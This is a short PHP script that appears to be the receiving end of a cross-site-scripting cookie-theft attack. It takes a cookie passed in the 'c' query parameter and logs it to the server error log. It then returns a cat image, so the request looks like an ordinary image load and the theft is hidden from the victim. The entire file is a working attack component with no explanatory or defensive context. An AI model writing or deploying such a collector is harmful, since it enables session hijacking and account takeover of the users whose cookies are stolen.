<?php
$cookie = $_GET['c'];  
error_log("COOKIE: " . $cookie);
header('Content-Type: image/jpeg');
readfile('cat.jpg');
?>
